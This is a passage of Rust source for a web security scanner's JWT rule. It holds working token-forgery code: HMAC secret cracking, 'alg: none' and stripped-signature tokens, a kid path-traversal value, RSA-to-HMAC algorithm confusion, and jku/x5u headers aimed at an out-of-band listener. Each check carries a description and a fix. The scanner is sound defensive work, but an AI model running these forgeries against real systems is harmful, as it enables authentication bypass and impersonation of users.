//! brainproxy's own rule: JSON Web Token weaknesses (100007). Once per page; the attacks
//! themselves run once per origin, token place and algorithm.
//!
//! It finds JWTs in the base request (a header such as `Authorization: Bearer`, a cookie, a
//! query or body parameter), also behind the auth placeholders a request recorded with
//! `--auth` carries (`«auth:NAME:token»`, a cookie's or a header's), and:
//!
//! - cracks an HMAC signature (HS256/384/512) against a list of common secrets, offline:
//!   nothing is sent;
//! - checks the page depends on the token: the token as recorded, sent again, has to be
//!   answered with a success (below 400) and differently from the same request with the token
//!   taken out (an empty value). A page that answers both alike doesn't depend on it, and it is
//!   left (a few pages per origin are tried). A malformed token is no control: a middleware may
//!   fail on one in front of a page that never reads the token;
//! - then sends forged tokens, each judged accepted when its answer matches the real token's
//!   and differs from the one without a token: a changed signature, `alg: none`, no signature, an
//!   expired token (only once the secret is known), a `kid` pointing at `/dev/null` signed
//!   with an empty key, the site's own RSA public key used as an HMAC secret (from PEM keys
//!   in its recorded responses, key files history names or links to, directory listings
//!   the passive scan found first, its JWKS, or common key paths), and a `jku`/`x5u` header naming the OOB listener (needs `oob start`).
//!
//! The payload is never changed except for `exp` in the expiry test, so a forged token
//! claims the same identity as the real one. With `--auth`, the session leaves the token's
//! header, cookie or parameter as the rule set it.
//!
//! A token behind a placeholder is read from the project's session values (as the client
//! fills it in), and the requests on record keep the placeholder for the real token. Its
//! signature is a secret: forged tokens never carry it (the changed-signature and `jku`/`x5u`
//! tests use a made-up one) and a weak-secret finding doesn't quote the token.
//!
//! Attack ideas follow the SasanLabs OWASP ZAP JWT add-on (Apache License 2.0) and the
//! WSTG's JWT testing guide; nothing is ported from them.

use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
use base64::Engine;
use regex::Regex;
use ring::hmac;
use serde_json::{Map, Value};
use std::sync::LazyLock;

use super::params::common::ComparableResponse;
use crate::http::RawRequest;
use crate::scan::active::{ActiveRule, BoxFuture, Cx, Keep, Response, RuleScope, Strength};
use crate::scan::{AlertDef, Confidence, Risk};

const TAGS: &[&str] = &["OWASP_2025_A07", "OWASP_2021_A07", "OWASP_2017_A02", "WSTG-v42-SESS-10"];
const REFS: &[&str] = &[
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
    "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
    "https://www.rfc-editor.org/rfc/rfc8725",
];

static NOT_VERIFIED: AlertDef = AlertDef {
    alert_ref: "100007-1",
    name: "JWT Signature Not Verified",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 347,
    wasc: 0,
    description: "The server accepted a JSON Web Token whose signature was changed. It doesn't check the signature, \
        so anyone can change the token's claims (the user, roles, expiry) and be trusted.",
    solution: "Verify every token's signature with the expected key and algorithm before reading its claims, and \
        reject a token that fails. Use the library's verify function, not its decode function.",
    references: REFS,
    tags: TAGS,
};

static NONE_ALG: AlertDef = AlertDef {
    alert_ref: "100007-2",
    name: "JWT 'none' Algorithm Accepted",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 347,
    wasc: 0,
    description: "The server accepted a JSON Web Token whose header says \"alg\": \"none\" and that has no \
        signature. Anyone can make a token it trusts.",
    solution: "Accept only the algorithms the application issues (an allow list set on the server), never the one \
        the token's header names, and never 'none'.",
    references: REFS,
    tags: TAGS,
};

static STRIPPED: AlertDef = AlertDef {
    alert_ref: "100007-3",
    name: "JWT Without Signature Accepted",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 347,
    wasc: 0,
    description: "The server accepted a JSON Web Token with its signature removed, though it rejects one with a \
        wrong signature. Anyone can make a token it trusts by leaving the signature out.",
    solution: "Reject a token without a signature. Verify every token with the expected key and algorithm.",
    references: REFS,
    tags: TAGS,
};

static WEAK_SECRET: AlertDef = AlertDef {
    alert_ref: "100007-4",
    name: "JWT Signed with a Weak Secret",
    risk: Risk::High,
    confidence: Confidence::High,
    cwe: 1391,
    wasc: 0,
    description: "The JSON Web Token's HMAC signature was made with a secret from a list of common or default \
        secrets. Anyone who tries the same list can sign tokens of their own, for any user.",
    solution: "Sign with a random secret of at least 256 bits kept out of source code, or with an asymmetric key \
        (RS256, ES256, EdDSA). Change the secret now: every token signed with it should be treated as forgeable.",
    references: REFS,
    tags: TAGS,
};

static EXPIRY: AlertDef = AlertDef {
    alert_ref: "100007-5",
    name: "JWT Expiry Not Enforced",
    risk: Risk::Medium,
    confidence: Confidence::Medium,
    cwe: 613,
    wasc: 0,
    description: "The server accepted a correctly signed JSON Web Token whose 'exp' claim is in the past. A token \
        that leaks keeps working for good.",
    solution: "Reject a token whose 'exp' has passed (allowing at most a small clock skew), and keep token \
        lifetimes short.",
    references: REFS,
    tags: TAGS,
};

static KID: AlertDef = AlertDef {
    alert_ref: "100007-6",
    name: "JWT 'kid' Path Traversal",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 22,
    wasc: 0,
    description: "The server accepted a JSON Web Token whose 'kid' header points at /dev/null and that is signed \
        with an empty key. It reads the key from a file the token names, so anyone can sign tokens with a file \
        whose contents they know.",
    solution: "Treat 'kid' as an identifier to look up in a fixed set of keys, never as a path or a query.",
    references: REFS,
    tags: TAGS,
};

static CONFUSION: AlertDef = AlertDef {
    alert_ref: "100007-7",
    name: "JWT Algorithm Confusion",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 347,
    wasc: 0,
    description: "The server issues tokens signed with an RSA key but accepted one signed with HS256 using its RSA \
        public key as the HMAC secret. The public key is public, so anyone can sign tokens it trusts.",
    solution: "Bind each key to its algorithm and verify with the algorithm the server expects, never the one the \
        token's header names.",
    references: REFS,
    tags: TAGS,
};

static HEADER_URL: AlertDef = AlertDef {
    alert_ref: "100007-8",
    name: "JWT Header URL Fetched (jku/x5u)",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 347,
    wasc: 0,
    description: "The server fetched the URL a JSON Web Token's 'jku' or 'x5u' header named. If it then trusts the \
        keys it finds there, anyone can sign tokens with a key of their own; the fetch itself is also a server-side \
        request to an address the client chose.",
    solution: "Ignore 'jku' and 'x5u', or accept only URLs on a fixed allow list, and take keys only from the \
        server's own configuration.",
    references: REFS,
    tags: &["OWASP_2025_A07", "OWASP_2021_A07", "WSTG-v42-SESS-10", "OUT_OF_BAND"],
};

static ALERTS: [&AlertDef; 8] =
    [&NOT_VERIFIED, &NONE_ALG, &STRIPPED, &WEAK_SECRET, &EXPIRY, &KID, &CONFUSION, &HEADER_URL];

/// Common and default HMAC secrets, one per line.
const SECRETS: &str = include_str!("data/jwt-secrets.txt");

/// A JWT in three parts (the signature may be empty).
static TOKEN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*").unwrap());

/// An auth placeholder for a session value bound to one header: the token, a cookie, a header.
static SESSION_PLACEHOLDER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"«auth:[^:»\s]+:(?:token|cookie:[^»\s]+|header:[^»\s]+)»").unwrap());

/// A token split into its parts, with its header and payload decoded.
#[derive(Debug, Clone)]
struct Jwt {
    raw: String,
    header_b64: String,
    payload_b64: String,
    signature: Vec<u8>,
    header: Map<String, Value>,
    payload: Map<String, Value>,
}

impl Jwt {
    fn parse(raw: &str) -> Option<Self> {
        let mut parts = raw.split('.');
        let (h, p, s) = (parts.next()?, parts.next()?, parts.next()?);
        if parts.next().is_some() {
            return None;
        }
        let object = |b64: &str| match serde_json::from_slice::<Value>(&URL_SAFE_NO_PAD.decode(b64).ok()?) {
            Ok(Value::Object(m)) => Some(m),
            _ => None,
        };
        let header = object(h)?;
        header.get("alg")?.as_str()?;
        Some(Self {
            raw: raw.to_string(),
            header_b64: h.to_string(),
            payload_b64: p.to_string(),
            signature: URL_SAFE_NO_PAD.decode(s).ok()?,
            header,
            payload: object(p)?,
        })
    }

    fn alg(&self) -> &str {
        self.header.get("alg").and_then(Value::as_str).unwrap_or("")
    }

    fn kid(&self) -> Option<&str> {
        self.header.get("kid").and_then(Value::as_str)
    }

    fn signing_input(&self) -> String {
        format!("{}.{}", self.header_b64, self.payload_b64)
    }
}

fn b64_json(m: &Map<String, Value>) -> String {
    URL_SAFE_NO_PAD.encode(serde_json::to_vec(m).unwrap_or_default())
}

/// The token's header with `changes` made (a null value removes the field).
fn header_with(jwt: &Jwt, changes: &[(&str, Value)]) -> Map<String, Value> {
    let mut h = jwt.header.clone();
    for (k, v) in changes {
        if v.is_null() {
            h.remove(*k);
        } else {
            h.insert((*k).to_string(), v.clone());
        }
    }
    h
}

fn hmac_alg(alg: &str) -> Option<hmac::Algorithm> {
    match alg {
        "HS256" => Some(hmac::HMAC_SHA256),
        "HS384" => Some(hmac::HMAC_SHA384),
        "HS512" => Some(hmac::HMAC_SHA512),
        _ => None,
    }
}

/// `header.payload.signature` signed with HMAC `alg` and `key`.
fn sign(alg: hmac::Algorithm, key: &[u8], header: &Map<String, Value>, payload_b64: &str) -> String {
    let input = format!("{}.{payload_b64}", b64_json(header));
    let tag = hmac::sign(&hmac::Key::new(alg, key), input.as_bytes());
    format!("{input}.{}", URL_SAFE_NO_PAD.encode(tag.as_ref()))
}

/// Secrets worth trying for `host`: the list, plus the host's own name and labels.
fn candidates(host: &str) -> Vec<String> {
    let mut out: Vec<String> = SECRETS
        .lines()
        .map(str::trim_end)
        .filter(|l| !l.starts_with('#') && !l.trim().is_empty())
        .map(String::from)
        .collect();
    out.push(String::new());
    let host = host.to_ascii_lowercase();
    if host.parse::<std::net::IpAddr>().is_err() {
        let labels: Vec<&str> = host.split('.').collect();
        out.push(host.clone());
        if labels.len() >= 2 {
            let name = labels[labels.len() - 2];
            out.push(labels[labels.len() - 2..].join("."));
            for s in ["", "secret", "-secret", "_secret", "123", "key", "-jwt", "_jwt"] {
                out.push(format!("{name}{s}"));
            }
        }
    }
    out.dedup();
    out
}

/// The secret an HMAC-signed token was made with, when it's one of `candidates`.
fn crack(jwt: &Jwt, candidates: &[String]) -> Option<String> {
    let alg = hmac_alg(jwt.alg())?;
    let input = jwt.signing_input();
    candidates
        .iter()
        .find(|c| hmac::verify(&hmac::Key::new(alg, c.as_bytes()), input.as_bytes(), &jwt.signature).is_ok())
        .cloned()
}

/// A DER length.
fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        vec![n as u8]
    } else {
        let bytes: Vec<u8> = n.to_be_bytes().into_iter().skip_while(|b| *b == 0).collect();
        let mut out = vec![0x80 | bytes.len() as u8];
        out.extend(bytes);
        out
    }
}

fn der(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend(der_len(content.len()));
    out.extend_from_slice(content);
    out
}

fn der_uint(bytes: &[u8]) -> Vec<u8> {
    let trimmed: Vec<u8> = bytes.iter().copied().skip_while(|b| *b == 0).collect();
    let mut v = if trimmed.first().is_some_and(|b| b & 0x80 != 0) { vec![0] } else { vec![] };
    v.extend(if trimmed.is_empty() { vec![0] } else { trimmed });
    der(0x02, &v)
}

/// The PEM forms (`BEGIN PUBLIC KEY`, then `BEGIN RSA PUBLIC KEY`) of an RSA JWK, each with
/// and without a final newline: libraries read the key file as given.
pub(super) fn rsa_pems(jwk: &Map<String, Value>) -> Vec<String> {
    let field = |k: &str| jwk.get(k).and_then(Value::as_str).and_then(|v| URL_SAFE_NO_PAD.decode(v).ok());
    let (Some(n), Some(e)) = (field("n"), field("e")) else { return vec![] };
    let pkcs1 = der(0x30, &[der_uint(&n), der_uint(&e)].concat());
    let alg_id = [0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00];
    let mut bits = vec![0u8];
    bits.extend(&pkcs1);
    let spki = der(0x30, &[alg_id.to_vec(), der(0x03, &bits)].concat());
    let pem = |label: &str, d: &[u8]| {
        let b = STANDARD.encode(d);
        let lines: Vec<&str> = b.as_bytes().chunks(64).map(|c| std::str::from_utf8(c).unwrap_or("")).collect();
        format!("-----BEGIN {label}-----\n{}\n-----END {label}-----", lines.join("\n"))
    };
    let mut out = Vec::new();
    for p in [pem("PUBLIC KEY", &spki), pem("RSA PUBLIC KEY", &pkcs1)] {
        out.push(format!("{p}\n"));
        out.push(p);
    }
    out
}

/// Paths where an origin's public signing key often is, tried after the key files its history
/// names. A site that answers any path with its app page gives no key there, just a request:
/// only PEM public keys and JWKS keys are read from an answer, never the page itself.
const KEY_PATHS: &[&str] = &[
    // The JWKS and the two metadata documents (OpenID Connect, RFC 8414) naming its `jwks_uri`.
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/jwks.json",
    "/jwt.pub",
    "/public.pem",
    "/publickey.pem",
    // OWASP Juice Shop's, and the shape of a key directory served with the app's static files.
    "/encryptionkeys/jwt.pub",
];
/// Requests the key search sends at most, per origin, token place and algorithm: the history
/// files, the common paths and a `jwks_uri` one names.
const KEY_REQUESTS: usize = 12;
/// Key files from history fetched at most (before the common paths).
const HISTORY_KEY_FILES: usize = 3;
/// Keys tried at most (each in up to four PEM forms).
const MAX_KEYS: usize = 4;

/// A public key to try as an HMAC secret.
struct PublicKey {
    /// Where it was found, for the finding.
    source: String,
    kid: Option<String>,
    /// The forms of it a server might have read, as text.
    pems: Vec<String>,
}

fn add_key(keys: &mut Vec<PublicKey>, key: PublicKey) {
    if !keys.iter().any(|k| k.pems.first() == key.pems.first()) && !key.pems.is_empty() {
        keys.push(key);
    }
}

/// A PEM public key, as a file holds it or as a JSON string escapes it.
static PEM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"-----BEGIN ((?:RSA )?PUBLIC KEY)-----(?:[A-Za-z0-9+/=\s]|\\[rn]|\\/)+-----END ((?:RSA )?PUBLIC KEY)-----",
    )
    .unwrap()
});

/// A link to a key file: `href` or `src` naming a `.pem` or `.pub`.
static KEY_LINK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)(?:href|src)\s*=\s*["']([^"'#?<>\s]+\.(?:pem|pub))["']"#).unwrap());

/// The PEM public keys in `text`, each in the forms a server may have read the file in: as
/// found (without a final newline) and with one.
fn pems_in(text: &str) -> Vec<Vec<String>> {
    let mut out: Vec<Vec<String>> = Vec::new();
    for m in PEM.find_iter(text) {
        let pem = m.as_str().replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\/", "/").replace("\r\n", "\n");
        let pem = pem.trim_end().to_string();
        let forms = vec![pem.clone(), format!("{pem}\n")];
        if !out.contains(&forms) {
            out.push(forms);
        }
    }
    out
}

/// What the project's history holds of an origin's public keys.
#[derive(Default)]
struct RecordedKeys {
    /// PEM keys in its recorded responses.
    pems: Vec<PublicKey>,
    /// Key files it requested or linked to (`.pem`, `.pub`, a JWKS), at most [`HISTORY_KEY_FILES`].
    paths: Vec<String>,
}

/// Reads `target`'s public keys from the project's history, read-only: the scan's recorder
/// writes to the project meanwhile.
fn recorded_keys(project: &std::path::Path, target: &crate::http::Target) -> rusqlite::Result<RecordedKeys> {
    use rusqlite::OpenFlags;
    let conn = rusqlite::Connection::open_with_flags(project, OpenFlags::SQLITE_OPEN_READ_ONLY)?;
    conn.busy_timeout(std::time::Duration::from_secs(2))?;
    let at = rusqlite::params![target.scheme, target.host, target.port];
    let mut out = RecordedKeys::default();
    let read =
        |r: &rusqlite::Row<'_>| Ok((r.get::<_, i64>(0)?, r.get::<_, String>(1)?, r.get::<_, Option<String>>(2)?));
    // Directory listings the passive scan found (Directory Browsing), first: a key directory
    // left listable names its files, and a full-text match on "pub" can be crowded out of
    // the newest rows below by script bundles.
    let mut st = conn.prepare(
        "SELECT DISTINCT h.id, h.path, h.resp_body_text FROM findings f JOIN history h ON h.id = f.history_id
         WHERE f.alert_ref = '10033' AND h.scheme = ?1 AND h.host = ?2 AND h.port = ?3
         ORDER BY h.id DESC LIMIT 10",
    )?;
    let mut bodies: Vec<(i64, String, Option<String>)> = st.query_map(at, read)?.collect::<rusqlite::Result<_>>()?;
    // Keys in bodies, and links to key files, found through the full-text index.
    let mut st = conn.prepare(
        "SELECT h.id, h.path, h.resp_body_text FROM history_fts JOIN history h ON h.id = history_fts.rowid
         WHERE history_fts MATCH ?4 AND h.scheme = ?1 AND h.host = ?2 AND h.port = ?3
         ORDER BY h.id DESC LIMIT 20",
    )?;
    for query in ["resp_body_text : \"public key\"", "resp_body_text : (pem OR pub)"] {
        let rows = st.query_map(rusqlite::params![target.scheme, target.host, target.port, query], read)?;
        bodies.extend(rows.collect::<rusqlite::Result<Vec<_>>>()?);
    }
    for (id, path, text) in bodies {
        let Some(text) = text else { continue };
        for pem in pems_in(&text) {
            add_key(
                &mut out.pems,
                PublicKey { source: format!("the key in history {id} ({path})"), kid: None, pems: pem },
            );
        }
        for link in KEY_LINK.captures_iter(&text).filter_map(|c| c.get(1)) {
            if let Some(p) = same_origin_path(link.as_str(), &path, &target.origin()) {
                if !out.paths.contains(&p) {
                    out.paths.push(p);
                }
            }
        }
    }
    // Key files requested before (their body may not be in the index).
    let mut st = conn.prepare(
        "SELECT DISTINCT path FROM history WHERE scheme = ?1 AND host = ?2 AND port = ?3
            AND (path LIKE '%.pem' OR path LIKE '%.pub' OR path LIKE '%jwks%') ORDER BY id DESC LIMIT 5",
    )?;
    let requested: Vec<String> = st.query_map(at, |r| r.get(0))?.collect::<rusqlite::Result<_>>()?;
    for p in requested.into_iter().rev() {
        if !out.paths.contains(&p) {
            out.paths.insert(0, p);
        }
    }
    out.paths.truncate(HISTORY_KEY_FILES);
    out.pems.truncate(MAX_KEYS);
    Ok(out)
}

/// `link`, found in the page at `base` (a path), as a path on `origin`; None for another origin.
fn same_origin_path(link: &str, base: &str, origin: &str) -> Option<String> {
    let path = if let Some(rest) = link.strip_prefix(origin) {
        rest.to_string()
    } else if link.contains("://") || link.starts_with("//") {
        return None;
    } else if link.starts_with('/') {
        link.to_string()
    } else {
        let dir = base.rsplit_once('/').map_or("", |(d, _)| d);
        format!("{dir}/{}", link.trim_start_matches("./"))
    };
    (path.starts_with('/') && !path.split('/').any(|s| s == "..")).then_some(path)
}

/// Where the token sits in the request, for the finding and for the session to leave alone.
fn locate(cx: &Cx, request: &[u8], token: &str) -> (String, Keep) {
    let mut keep = Keep::default();
    let mut label = None;
    if let Ok(head) = RawRequest::from_bytes(request.to_vec()).head() {
        for (k, v) in &head.headers {
            if k.eq_ignore_ascii_case("cookie") {
                for pair in v.split(';') {
                    if let Some((name, value)) = pair.trim().split_once('=') {
                        if value.contains(token) {
                            keep.cookies.push(name.to_string());
                            label.get_or_insert_with(|| format!("Cookie: {name}"));
                        }
                    }
                }
            } else if v.contains(token) {
                keep.headers.push(k.clone());
                label.get_or_insert_with(|| k.clone());
            }
        }
    }
    for (name, value) in cx.base().params() {
        if value.contains(token) {
            label.get_or_insert_with(|| name.clone());
            keep.params.push(name);
        }
    }
    (label.unwrap_or_else(|| "JWT".into()), keep)
}

/// A token in the base request.
struct Found {
    jwt: Jwt,
    /// The text in the request that stands for it: the token itself, or an auth placeholder.
    from: String,
    /// What `from` stands for: the token, or a header value holding it (`Bearer ...`).
    value: String,
    /// Behind a placeholder: the token is a secret the requests on record must not hold.
    hidden: bool,
}

impl Found {
    /// The base request with the token replaced by `token`.
    fn request(&self, request: &[u8], token: &str) -> Vec<u8> {
        with_token(request, &self.from, &self.value.replace(&self.jwt.raw, token))
    }
}

/// The JWTs in the base request, each once: written in it, then behind its session placeholders.
fn found(cx: &Cx, text: &str) -> Vec<Found> {
    let mut out: Vec<Found> = Vec::new();
    let mut add = |raw: &str, from: &str, value: &str, hidden: bool| {
        if out.iter().any(|f| f.jwt.raw == raw) {
            return;
        }
        if let Some(jwt) = Jwt::parse(raw) {
            out.push(Found { jwt, from: from.to_string(), value: value.to_string(), hidden });
        }
    };
    for m in TOKEN.find_iter(text) {
        add(m.as_str(), m.as_str(), m.as_str(), false);
    }
    for m in SESSION_PLACEHOLDER.find_iter(text) {
        let Some(value) = cx.session_value(m.as_str()) else { continue };
        if let Some(t) = TOKEN.find(&value) {
            add(t.as_str(), m.as_str(), &value, true);
        }
    }
    out
}

/// The base request with every copy of `from` replaced by `to`.
fn with_token(request: &[u8], from: &str, to: &str) -> Vec<u8> {
    let text = String::from_utf8_lossy(request).replace(from, to);
    RawRequest::from_bytes(text.into_bytes()).update_content_length().into_bytes()
}

/// Whether two answers are the same page (same status, nearly the same content).
fn same(a: &Response, b: &Response) -> bool {
    a.status == b.status && ComparableResponse::new(a, "").compare_with(&ComparableResponse::new(b, "")) >= 0.9
}

/// How many pages may be tried per origin and token place to find one that reads the token.
fn tries(strength: Strength) -> usize {
    match strength {
        Strength::Low => 2,
        Strength::Medium => 3,
        Strength::High => 5,
        Strength::Insane => 10,
    }
}

struct Probe<'a> {
    cx: &'a Cx,
    request: &'a [u8],
    found: &'a Found,
    jwt: &'a Jwt,
    /// What the session leaves alone; it grows by the cookies answers to forged tokens set.
    keep: std::sync::Mutex<Keep>,
    place: String,
    real: Response,
    /// The answer without the token.
    absent: Response,
}

impl Probe<'_> {
    /// Sends `forged` in place of the token; its answer when the server accepted it.
    async fn accepted(&self, forged: &str) -> Option<Response> {
        if self.cx.stopped() {
            return None;
        }
        let resp = self.send(self.found.request(self.request, forged)).await.ok()?;
        (same(&resp, &self.real) && !same(&resp, &self.absent)).then_some(resp)
    }

    /// Sends a request with a forged token. A cookie its answer sets to a token (an accepted
    /// forged one, handed back) is kept off the later requests: with `--auth` the session
    /// would learn it and send it with every forged token after, and a server that reads the
    /// cookie first would judge that one instead.
    async fn send(&self, request: Vec<u8>) -> crate::error::Result<Response> {
        let keep = self.keep.lock().expect("the keep lock is never held across a panic").clone();
        let resp = self.cx.send_keeping(request, &keep).await?;
        let set: Vec<String> = resp
            .headers_named("set-cookie")
            .filter_map(|v| v.split(';').next()?.split_once('='))
            .filter(|(_, v)| TOKEN.is_match(v))
            .map(|(k, _)| k.trim().to_string())
            .collect();
        if !set.is_empty() {
            let mut keep = self.keep.lock().expect("the keep lock is never held across a panic");
            for name in set {
                if !keep.cookies.contains(&name) {
                    keep.cookies.push(name);
                }
            }
        }
        Ok(resp)
    }

    fn report(&self, def: &'static AlertDef, forged: &str, other: String, resp: &Response) {
        // The two answers it was judged against, for a reader checking it by hand (findings
        // verify sends all three again).
        let row = |r: &Response| r.history_id.map(|id| format!(" (history {id})")).unwrap_or_default();
        let other = format!(
            "{other}\n\nThe real token{} was answered {}, the request without a token{} {}.",
            row(&self.real),
            self.real.status,
            row(&self.absent),
            self.absent.status
        );
        self.cx.report(def.raise(self.place.clone(), "").attack(forged.to_string()).other_info(other), resp);
    }

    /// Public keys of the origin, at most [`MAX_KEYS`]: PEM keys in responses recorded from it
    /// (no request), then what [`KEY_REQUESTS`] requests find at the key files its history
    /// names or links to, its JWKS (or the same-origin `jwks_uri` of its OpenID configuration)
    /// and common key file paths. JWKS keys are the token's `kid` alone when it's there.
    async fn public_keys(&self) -> Vec<PublicKey> {
        let target = self.cx.target().clone();
        let origin = target.origin();
        let host = target.host_header();
        let project = self.cx.project().to_path_buf();
        let recorded = tokio::task::spawn_blocking(move || recorded_keys(&project, &target).unwrap_or_default())
            .await
            .unwrap_or_default();
        let mut keys: Vec<PublicKey> = recorded.pems;
        let mut paths: Vec<String> = recorded.paths;
        for p in KEY_PATHS {
            if !paths.iter().any(|q| q == p) {
                paths.push((*p).to_string());
            }
        }
        let mut i = 0;
        while i < paths.len() && i < KEY_REQUESTS && keys.len() < MAX_KEYS && !self.cx.stopped() {
            let path = paths[i].clone();
            i += 1;
            let req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\n\r\n");
            let Ok(resp) = self.cx.send(req.into_bytes()).await else { continue };
            if resp.status != 200 {
                continue;
            }
            let text = String::from_utf8_lossy(&resp.body);
            for pem in pems_in(&text) {
                add_key(&mut keys, PublicKey { source: format!("the key file at {path}"), kid: None, pems: pem });
            }
            let Ok(json) = serde_json::from_slice::<Value>(&resp.body) else { continue };
            // The scope guard would refuse another origin anyway. Fetched next.
            if let Some(rest) = json.get("jwks_uri").and_then(Value::as_str).and_then(|u| u.strip_prefix(&origin)) {
                if rest.starts_with('/') && !paths.iter().any(|p| p == rest) {
                    paths.insert(i, rest.to_string());
                }
            }
            let mut jwks: Vec<PublicKey> = Vec::new();
            for k in json.get("keys").and_then(Value::as_array).into_iter().flatten() {
                if let Some(m) = k.as_object().filter(|m| m.get("kty").and_then(Value::as_str) == Some("RSA")) {
                    let kid = m.get("kid").and_then(Value::as_str).map(String::from);
                    let source = format!("the published RSA public key at {path}");
                    jwks.push(PublicKey { source, kid, pems: rsa_pems(m) });
                }
            }
            if let Some(want) = self.jwt.kid() {
                if jwks.iter().any(|k| k.kid.as_deref() == Some(want)) {
                    jwks.retain(|k| k.kid.as_deref() == Some(want));
                }
            }
            for k in jwks {
                add_key(&mut keys, k);
            }
        }
        keys.truncate(MAX_KEYS);
        keys
    }

    /// A signature that isn't the token's: one bit changed, or for a hidden token (whose
    /// signature must not go on record) a made-up one of the same length.
    fn wrong_signature(&self) -> Vec<u8> {
        let mut sig = if self.found.hidden {
            (0..self.jwt.signature.len()).map(|i| (i as u8).wrapping_mul(37) ^ 0x5a).collect()
        } else {
            self.jwt.signature.clone()
        };
        match sig.last_mut() {
            Some(b) => *b ^= 0x01,
            None => sig.push(0x42),
        }
        sig
    }

    async fn run(&self, secret: Option<&str>) {
        let jwt = self.jwt;
        let strength = self.cx.strength();
        // A changed signature: nothing below is worth sending once this is accepted.
        let flipped = format!("{}.{}", jwt.signing_input(), URL_SAFE_NO_PAD.encode(self.wrong_signature()));
        if let Some(resp) = self.accepted(&flipped).await {
            let how = if self.found.hidden { "a made-up signature" } else { "one bit of its signature changed" };
            let other = format!(
                "The token was sent with {how} and was answered like the real token, while the request without a \
                 token was answered differently."
            );
            self.report(&NOT_VERIFIED, &flipped, other, &resp);
            return;
        }
        // The signature removed, the header as it was. Accepted, it explains `alg: none` too.
        let stripped = format!("{}.", jwt.signing_input());
        let no_signature = self.accepted(&stripped).await;
        if let Some(resp) = &no_signature {
            self.report(&STRIPPED, &stripped, "The token was sent with its signature removed.".into(), resp);
        }
        // alg: none, with no signature.
        let nones: &[&str] = if strength == Strength::Low { &["none"] } else { &["none", "None", "NONE", "nOnE"] };
        for alg in nones.iter().filter(|_| no_signature.is_none()) {
            let forged = format!("{}.{}.", b64_json(&header_with(jwt, &[("alg", Value::from(*alg))])), jwt.payload_b64);
            if let Some(resp) = self.accepted(&forged).await {
                let other = format!("The token's header was changed to \"alg\": \"{alg}\" and its signature removed.");
                self.report(&NONE_ALG, &forged, other, &resp);
                break;
            }
        }
        // An expired token, signed with the secret found offline.
        if let (Some(secret), Some(alg)) = (secret, hmac_alg(jwt.alg())) {
            if jwt.payload.get("exp").is_some_and(Value::is_number) {
                let mut payload = jwt.payload.clone();
                let past = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map_or(0, |d| d.as_secs())
                    .saturating_sub(86_400);
                payload.insert("exp".into(), Value::from(past));
                let forged = sign(alg, secret.as_bytes(), &jwt.header, &b64_json(&payload));
                if let Some(resp) = self.accepted(&forged).await {
                    let other = format!(
                        "The token's 'exp' was set to {past} (a day ago) and the token signed again with the secret \
                         found; it was still accepted."
                    );
                    self.report(&EXPIRY, &forged, other, &resp);
                }
            }
        }
        if strength == Strength::Low {
            return;
        }
        // kid pointing at an empty file, signed with an empty key.
        if jwt.kid().is_some() {
            let kid = "../../../../../../../../dev/null";
            let header = header_with(jwt, &[("alg", Value::from("HS256")), ("kid", Value::from(kid))]);
            let forged = sign(hmac::HMAC_SHA256, b"", &header, &jwt.payload_b64);
            if let Some(resp) = self.accepted(&forged).await {
                let other =
                    format!("The token's 'kid' was set to \"{kid}\" and the token signed with HS256 and an empty key.");
                self.report(&KID, &forged, other, &resp);
            }
        }
        // RSA public key as an HMAC secret.
        if ["RS", "PS"].iter().any(|p| jwt.alg().starts_with(p)) {
            'keys: for key in self.public_keys().await {
                for pem in &key.pems {
                    let header = header_with(jwt, &[("alg", Value::from("HS256"))]);
                    let forged = sign(hmac::HMAC_SHA256, pem.as_bytes(), &header, &jwt.payload_b64);
                    if let Some(resp) = self.accepted(&forged).await {
                        let other = format!(
                            "The token was signed with HS256, using as the secret {}{} in PEM form:\n{pem}",
                            key.source,
                            key.kid.as_deref().map(|k| format!(" (kid {k})")).unwrap_or_default()
                        );
                        self.report(&CONFUSION, &forged, other, &resp);
                        break 'keys;
                    }
                }
            }
        }
        // jku and x5u naming the OOB listener; the original signature is kept, unless it is
        // hidden: a server fetches the URL before it checks the signature anyway.
        for field in ["jku", "x5u"] {
            if self.cx.stopped() {
                return;
            }
            let Some(payload) = self.cx.oob_payload() else { return };
            let header = header_with(jwt, &[(field, Value::from(payload.url.clone()))]);
            let sig = if self.found.hidden { self.wrong_signature() } else { jwt.signature.clone() };
            let forged = format!("{}.{}.{}", b64_json(&header), jwt.payload_b64, URL_SAFE_NO_PAD.encode(sig));
            let request = self.found.request(self.request, &forged);
            let resp = self.send(request.clone()).await.ok();
            let finding = HEADER_URL
                .raise(self.place.clone(), "")
                .attack(forged)
                .other_info(format!("The token's '{field}' header named the OOB listener, which was called."));
            self.cx.oob_register(&payload, finding, &request, resp.as_ref());
        }
    }
}

pub struct JwtWeaknesses;

impl ActiveRule for JwtWeaknesses {
    fn id(&self) -> u32 {
        100007
    }

    fn name(&self) -> &'static str {
        "JWT Weaknesses"
    }

